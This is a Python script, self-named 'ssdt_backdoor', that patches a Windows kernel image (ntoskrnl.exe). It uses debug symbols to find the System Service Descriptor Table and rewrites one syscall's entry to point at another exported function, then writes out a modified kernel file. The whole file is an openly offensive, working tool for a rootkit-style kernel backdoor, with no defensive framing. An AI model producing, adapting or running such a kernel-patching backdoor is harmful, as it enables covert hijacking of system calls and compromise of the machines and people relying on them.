import argparse
import struct 
import itertools

from tools.pdbtools import download_file_pdb, get_public_symbol, get_symbol_file_offset
from tools.petools import get_export_address

def main():
    parser = argparse.ArgumentParser(
        prog="ssdt_backdoor",
        description="Patch the SSDT in ntoskrnl.exe to redirect syscalls",
    )
    
    # Arguments 
    parser.add_argument("--ntoskrnl", required=True, help="Path to the input ntoskrnl.exe")
    parser.add_argument("--target-syscall", required=True, help="Syscall function to redirect")
    parser.add_argument("--redirect-to", required=True, help="Function to redirect the syscall to")
    parser.add_argument("-O", "--output", default="ntoskrnl_patched.exe", help="Output patched file")

    # Parse arguments
    args = parser.parse_args()
    
    # Download the PDB
    pdb_file = download_file_pdb(args.ntoskrnl)
    
    # Get the SSDT table info from the PDB
    table_info = get_public_symbol(pdb_file, "KiServiceTable")
    print(f"[+] Found symbol '{table_info.name}'")
    print(f"    Section Index: {table_info.section_index}")
    print(f"    Section Offset (RVA): 0x{table_info.section_offset:X}")
    print(f"    Flags: 0x{table_info.flags:08X}")
    
    # Map section offset to a file offset in the original PE
    table_offset = get_symbol_file_offset(args.ntoskrnl, table_info)
    print(f"[+] KiServiceTable file offset in '{args.ntoskrnl}': 0x{table_offset:X}")
    
    # Get KiServiceLimit from PDB
    limit_info = get_public_symbol(pdb_file, "KiServiceLimit")
    print(f"[+] Found symbol '{limit_info.name}'")
    print(f"    Section Index: {limit_info.section_index}")
    print(f"    Section Offset (RVA): 0x{limit_info.section_offset:X}")
    print(f"    Flags: 0x{limit_info.flags:08X}")
    
    # Get file offset
    limit_offset = get_symbol_file_offset(args.ntoskrnl, limit_info)
    print(f"[+] KiServiceLimit file offset in '{args.ntoskrnl}': 0x{limit_offset:X}")
    
    # Get syscall export 
    syscall_export = get_export_address(args.ntoskrnl, args.target_syscall)
    print(f"[+] Found syscall export: {syscall_export.name.decode()}")
    print(f"    Name: {syscall_export.name.decode()}, RVA: {hex(syscall_export.address)}, Ordinal: {syscall_export.ordinal}")

    # Get redirect function export 
    redirect_export = get_export_address(args.ntoskrnl, args.redirect_to)
    print(f"[+] Found redirect export: {redirect_export.name.decode()}")
    print(f"    Name: {redirect_export.name.decode()}, RVA: {hex(redirect_export.address)}, Ordinal: {redirect_export.ordinal}")
    
    # Open file for read
    with open(args.ntoskrnl, "rb") as f:
        # Read entire file into buffer
        data = bytearray(f.read())

    # Get file size
    file_size = len(data)
    
    # Read syscall limit value
    limit_bytes = data[limit_offset:limit_offset+4]
    syscall_limit = struct.unpack("<I", limit_bytes)[0]
    print(f"[+] KiServiceLimit value: {syscall_limit}")
    
    for i in range(syscall_limit):
        # Calculate entry offset
        entry_off = table_offset + (i * 4)

        # Get syscall RVA
        entry_bytes = data[entry_off:entry_off+4]
        entry_val = struct.unpack("<I", entry_bytes)[0]
        
        # Is it same as our syscall export ?
        if entry_val == syscall_export.address:
            print(f"[+] Found match at syscall {i}, file offset 0x{entry_off:X}, value 0x{entry_val:X}")

            # Patch it with redirect function RVA
            new_val = redirect_export.address
            data[entry_off:entry_off+4] = struct.pack("<I", new_val)
            print(f"[+] Patched syscall {i} at 0x{entry_off:X} with 0x{new_val:X}")
            break

    # Save to output file
    with open(args.output, "wb") as f:
        f.write(data)
    print(f"[+] Patched file saved as {args.output}")
    
if __name__ == "__main__":
    main()